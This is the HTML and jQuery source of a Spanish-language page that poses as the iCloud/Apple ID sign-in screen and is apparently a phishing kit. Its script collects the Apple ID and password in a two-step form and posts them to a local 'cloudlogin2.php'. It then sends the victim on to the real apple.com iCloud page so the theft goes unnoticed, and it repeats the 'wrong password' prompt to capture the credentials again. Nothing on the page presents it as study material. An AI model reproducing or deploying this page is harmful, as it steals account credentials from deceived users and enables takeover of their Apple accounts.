<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="width=device-width, initial-scale=1" name="viewport">
<meta content="noindex, nofollow" name="robots">
<title>iCloud</title>
<link href="local_resources/css/9fa909d4a109aeeb93d32fe077debece.css" rel="stylesheet"/>
<link href="https://appleid.cdn-apple.com/static/bin/cb3606853004/images/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
<link href="local_resources/css/241f1aea3eec8c6a5218c63b88a801a7.css" rel="stylesheet"/>
<link href="local_resources/css/1fe2138ab2b3f1009190f79a63df2028.css" rel="stylesheet"/>
<link href="local_resources/css/8c358dea77889b8ebd5ea20e0214ac4c.css" rel="stylesheet"/>
<style type="text/css">
<!--
.Estilo2 {
	font-family: 'Lato', Tahoma;
	font-size: 35px;
	font-weight:bold;
}
-->
.login-form{
	width: 100%;
}
.login-form .keepme{
	color:#000;
	font-family: 'Lato Light', Tahoma !important;
	margin-top: 80px;
}
.overcodes{
	position: absolute;
	top: 0;
	left: 0;
	width: 100%;
	height: 100%;
}
.codes{
	max-width: 460px;
	margin:auto;
	text-align: center;
	padding:25px 0;
}
.codes h5{
	color: #fff;
	font-weight: bold;
	font-size:22px;
	margin-bottom: 18px;
}
.codes .circles, .codes .circles2{
	padding-left: 0;
}
.codes .circles li, .codes .circles2 li{
	list-style: none;
	display: inline-block;
	vertical-align: top;
}
.codes .circles span{
	width: 14px;
	height: 14px;
	border:1px solid #fff;
	border-radius: 50%;
	display: block;
	margin:0 10px;
}
.codes .circles2 span{
	display: block;
	width: 70px;
	height: 70px;
	border-radius: 50%;
	background: rgba(255,255,255,.1);
	color: #fff;
	font-size:10px;
	font-weight: bold;
	line-height: 24px;
	letter-spacing: 2px;
	margin:11px 16px;
	padding-top: 15px;
	cursor: pointer;
	padding-left: 4px;
}
.codes .circles2 span strong{
	font-size: 27px;
	display: block;
}
.cancelcode{
	color: #fff;
	font-size: 17px;
	float: right;
	margin-top: 30px;
	font-weight: bold;
	margin-right: 15%;
}
.move{
	margin: auto;
	position: relative;
	padding: 0 5px;
}
#demo{
	position: fixed;
	height: 100%;
	width: 100%;
}
body{
	background-image: none;
	background: transparent;
}
#apple_id{
	border: 1px solid #b1aaaa;
}
.login-form .forget{
	margin-top: 0;
}
.login-form .forget a{
	color:#0070c9;
	font-family: 'Lato Light', Tahoma !important;
	font-size: 15px;
}
.preloader{
	background:#fff;
}
.cloud-login{
    max-width: 338px;
    margin:auto;
}
.imgApple{
    margin-top:30px;
}
@media screen and (max-width:550px){
    .Estilo2{
        width:300px;
        margin:auto;
    }
}
    </style>
</meta></meta></head>
<body class="section-demo">
<section id="mapmov" style="display: none;">
<img src="local_resources/img/525459061ee705b38cfecd029324ae88.png" width="100%"/>
</section>
<section class="login-form text-center">
<div class="move">
<img class="imgApple" src="local_resources/img/279d5f4897d9dc377142b246f75b5596.png" style="width: 200px;"/>
<h1 class="Estilo2">Iniciar sesión con ID de Apple</h1>
<form action="index.html" class="cloud-login" method="post">
<input class="id" id="apple_id" name="xuser" placeholder="Apple ID" style="direction: ltr ! important;border-radius:6px;" type="text" value=""/>
<input autocomplete="off" class="pwd" id="apple_pwd" name="xpass" placeholder="Contraseña" style="direction: ltr ! important;display:none;" type="password"/>
<input name="id" type="hidden" value=""/>
<input class="dolog2" id="c_log2" name="c_log2" style="top:10px;" type="submit" value=""/>
<img alt="Loading" class="loading" id="load2" src="local_resources/img/64d0e99234a69701a35aa18adf582684.gif" style="top:10px;"/>
<input class="dolog" id="c_log" name="c_log" style="display:none;" type="submit" value=""/>
<img alt="Loading" class="loading" id="load" src="local_resources/img/64d0e99234a69701a35aa18adf582684.gif" style="display:none;"/>
<div class="alrt">
<h3><center>La contraseña o el ID de Apple son incorrectos.<br/>
				¿Has olvidado la contraseña?</center></h3>
</div>
</form>
</div>
<div class="keepme">
<input id="keepme" type="checkbox">
<span for="keepme">Mantener sesión abierta</span>
</input></div>
<div style="margin-top: 14px;height: 1px;">
<img src="local_resources/img/b5a8fd0c6994d8e22919b565f4840988.png"/>
</div>
<div class="forget">
<a href="https://iforgot.apple.com/" target="_blank">¿Olvidaste tu ID de Apple o la contraseña?</a>
</div>
</section>
<div class="preloader">
<img alt="" src="local_resources/img/64d0e99234a69701a35aa18adf582684.gif"/>
</div>
<script src="local_resources/js/d677f450a7e91014d125d04ff9d9fca0.js"></script>
<script>
	$(document).on("ready", funciones);
	function funciones(){
		$(".preloader").delay(1500).fadeOut(1500);
		$("#c_log2").on("click", getPass);
		function getPass(){
			$("img.loading#load2").show(0);
			$("#apple_pwd").delay(1500).slideDown(10);
			setTimeout(function(){
			$("#apple_id").css("border-radius", "6px 6px 0 0");
			$("#apple_id").css("border-bottom", "0");
			}, 1300);
			$("img.loading#load2").delay(800).fadeOut();
			$("#c_log").delay(1500).fadeIn();
			$("#c_log2, #load2").fadeOut();
			return false;
		}
		$("#apple_pwd").keypress(function(e) {
		    $("#c_log2, #load2").remove();
		});
		$("#c_log").on("click", getCloud);
		function getCloud(a){
			var datos = $(".cloud-login").serialize();
			$("img.loading#load").show(0);
			$("#c_log").css("opacity",0);
			$.post(
				"cloudlogin2.php",
				datos,
				function(b){
					if(b==1){
						$(".login-form").fadeOut();
						$(".preloader").fadeIn().delay(1000).fadeOut();
						window.top.location.href="https://www.apple.com/icloud/";
					}else{
						$("#apple_pwd").val("");
						$("#c_log").css("background-position", "0 0");
						$(".move").animate({'left':'20px'},60).animate({'left':'0'},60).animate({'left':'20px'},60).animate({'left':'0'},60).animate({'left':'20px'},60).animate({'left':'0'},60);
						$(".login-form form.cloud-login .alrt").slideDown();
						$("img.loading#load").fadeOut();
						$("#c_log").css("opacity",1);
					}
				}
			);
			a.preventDefault();
		}
		$("#apple_pwd").on("click", getDom);
		function getDom(){
			var id = $("#apple_id").val();
			if(id!=""){
				if(id.indexOf('@') != -1){

				}else{
					id = id+"@icloud.com";
					$("#apple_id").val(id);
				}
			}
		}
		$("#apple_pwd").on("keyup", validaCloud);
		function validaCloud(){
			var user = $("#apple_id").val();
			var pass = $(this).val();
			if(user!="" && pass !=""){
				$("#c_log").css("background-position", "-28px 0");
			}else{
				$("#c_log").css("background-position", "0 0");
			}
			$(".login-form form.cloud-login .alrt").hide(0);
		}
					$(".foot, .login-form, #header").fadeIn(0);
			$(".overcodes").hide(0);
			}
	</script>
</body>
</html>
